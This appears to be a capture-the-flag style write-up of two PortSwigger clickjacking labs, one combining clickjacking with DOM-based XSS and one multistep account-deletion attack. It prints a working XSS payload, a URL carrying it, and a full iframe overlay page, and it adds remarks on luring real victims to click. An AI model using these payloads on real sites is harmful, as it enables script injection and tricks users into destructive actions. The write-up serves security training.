## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **Clickjacking**:

**Exploiting clickjacking vulnerability to trigger DOM-based XSS**  
This lab demonstrates how clickjacking can be used to trigger DOM-based cross-site scripting attacks.

**Multistep clickjacking**  
This lab shows how attackers can perform clickjacking attacks involving multiple steps or user interactions.

---

### LAB 4 - Exploiting clickjacking vulnerability to trigger DOM-based XSS

### Lab Description

![image](https://github.com/user-attachments/assets/052ae54c-d4d9-43e4-af5d-0d706361f33f)

### Solution


The lab application is again the blog website. This time, no credentials are provided.

After a first look at the page, I see two options to send input:

	• The Submit feedback form that is linked at the top
	• The comments feature on each article
While browsing, Burp confirms for both pages that they are frameable:


<img width="520" height="125" alt="image" src="https://github.com/user-attachments/assets/63b6099c-b622-4344-9660-5f1c83e56046" />



## Submit a feedback

So next I submit the feedback form. The name gets reflected in the page content

It reflects the content of the name field:


<img width="403" height="86" alt="image" src="https://github.com/user-attachments/assets/ce2ed673-1b90-4daa-9877-47fd48181ce5" />


It is inside a span tag:



<img width="534" height="69" alt="image" src="https://github.com/user-attachments/assets/71e6cddb-476a-461d-8bd7-3fd8086b0bcb" />


We can exploit the XSS using the payload:

```
</span><img src=x onerror=alert(1)><span>
```

<img width="424" height="98" alt="image" src="https://github.com/user-attachments/assets/2986ed53-2627-4201-8e51-56d50530b3c3" />


The fields can be populated using GET parameters:

```
/feedback?name=</span><img src=x onerror=alert(1)><span>&email=a@a.com&subject=a&message=a
```

<img width="811" height="311" alt="image" src="https://github.com/user-attachments/assets/5c25acb9-7058-40cb-a09c-29f5386034a6" />


Looking at this script reveals an injection point:


<img width="564" height="349" alt="image" src="https://github.com/user-attachments/assets/ff21ca1e-e24e-4c85-b860-00535fbdd1b9" />

So we can execute the attack with a payload like this:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:440px;
			left:70px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">Click me</button>
	</div>
	<iframe id="target_website" src="https://id.web-security-academy.net/feedback?name=%3C/span%3E%3Cimg%20src=x%20onerror=print()%3E%3Cspan%3E&email=a@a.com&subject=a&message=a">
	</iframe>
</body>
```

A final test shows a properly filled and aligned page:

<img width="603" height="825" alt="image" src="https://github.com/user-attachments/assets/eec6f4d9-c699-4694-b067-38444aada979" />


After reducing the opacity to 0.000, Store and Deliver exploit to victim, the lab updates to SOLVED.

<img width="1169" height="213" alt="image" src="https://github.com/user-attachments/assets/957033fc-665b-48ee-a8d6-518c937eea78" />




---


### LAB 5 - Multistep clickjacking

### Lab Description

<img width="847" height="490" alt="image" src="https://github.com/user-attachments/assets/e54cdc5e-60ad-4e14-bf93-f3be00d93565" />

### Solution


**Analysis**

The lab application is the already well-known blog website. The targeted functionality is an authenticated one, so I log into the account of wiener to have a look.

The account page features a prominent Delete account button.

<img width="779" height="418" alt="image" src="https://github.com/user-attachments/assets/0acdf386-8df4-47d6-82f9-fdf54f8a8302" />

Once I click on it, an additional dialog is shown:


<img width="623" height="281" alt="image" src="https://github.com/user-attachments/assets/31275309-7fa8-44cc-b502-37283d209041" />

The requests are very similar:

<img width="892" height="348" alt="image" src="https://github.com/user-attachments/assets/0d0ce4f5-0bbd-440a-8bf2-09a45b12c8ce" />

**Two obvious options are not possible here:**

* I cannot manipulate the form itself. Otherwise, it would be easy to bypass the second check by simply adding the confirmation value to the form.

* The CSRF token prevents me from directly issuing the delete request within an iframe. Furthermore, the `/my-account/delete` endpoint does not accept `GET` requests, so it cannot be directly loaded into an iframe.
	
  So I need to convince the user to click twice. In real life, knowing common user behaviour will be important to convince them not only to click but also the order of clicks. Knowing as much about my victim (or victim group) is key   here — some are triggered by cars, others I can get rage-clicking by using politics, and for some audiences, nudes are always best.

## Craft the malicious HTML

Here in the lab, I have the information that the user clicks on anything that tells him to click. My victim user even obeys the order I tell him to click.
So that is exactly what I’ll do:

<img width="880" height="710" alt="image" src="https://github.com/user-attachments/assets/2e702077-a7f3-4274-a225-58b17bfde130" />



This renders the page with two Click me fields, the first perfectly overlays the Delete account button.

<img width="783" height="585" alt="image" src="https://github.com/user-attachments/assets/87217bdb-d8dd-45d4-922b-68ace8545f62" />


Whereas the next does the same for the confirmation

<img width="642" height="560" alt="image" src="https://github.com/user-attachments/assets/98354772-e57f-4346-926c-9f3e29dc72d6" />



After reducing the opacity to `0.000`, `Store` and `Deliver exploit to victim`, the lab updates to solved

<img width="695" height="114" alt="image" src="https://github.com/user-attachments/assets/6f94ba0c-6528-4c69-a438-8b66d8c17f88" />

---




### Solution

